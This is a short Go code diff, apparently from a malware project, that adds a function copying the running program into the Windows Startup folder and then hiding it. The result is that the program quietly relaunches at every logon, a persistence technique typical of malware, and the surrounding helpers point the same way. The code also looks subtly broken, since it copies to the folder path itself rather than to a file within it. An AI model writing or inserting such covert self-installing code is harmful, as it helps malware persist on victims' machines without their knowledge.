@@ -53,3 +53,12 @@ func CopyExecutable() error {
 	}
 	return HideFile(bin)
 }
+
+func TryFolderInstall() error {
+	sf := path.Join(os.ExpandEnv("%appdata%"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+	err := util.CopyFile(os.Args[0], sf)
+	if err != nil {
+		return err
+	}
+	return HideFile(sf)
+}
